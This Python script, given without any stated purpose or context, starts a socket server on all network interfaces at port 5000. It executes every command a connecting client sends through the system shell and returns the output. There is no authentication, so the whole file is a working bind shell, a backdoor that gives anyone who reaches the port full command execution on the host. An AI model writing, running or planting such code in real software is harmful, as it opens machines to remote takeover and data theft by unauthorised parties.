import socket
import subprocess

def start_server(host='0.0.0.0', port=5000):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Server started on {host}:{port}. Waiting for connections...")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Connection established with {client_address}")
        
        try:
            while True:
                command = client_socket.recv(1024).decode().strip()
                if not command:
                    break
                print(f"Received command: {command}")

                if command.lower() == 'exit':
                    print("Closing connection...")
                    client_socket.send(b"Connection closed.")
                    break

                try:
                    # Execute the command and get the output
                    output = subprocess.check_output(command, shell=True, text=True)
                    client_socket.send(output.encode())
                except Exception as e:
                    error_message = f"Error executing command: {e}"
                    client_socket.send(error_message.encode())
        except ConnectionResetError:
            print("Connection lost.")
        finally:
            client_socket.close()
            print("Connection closed.")
            
    server_socket.close()

if __name__ == "__main__":
    start_server()
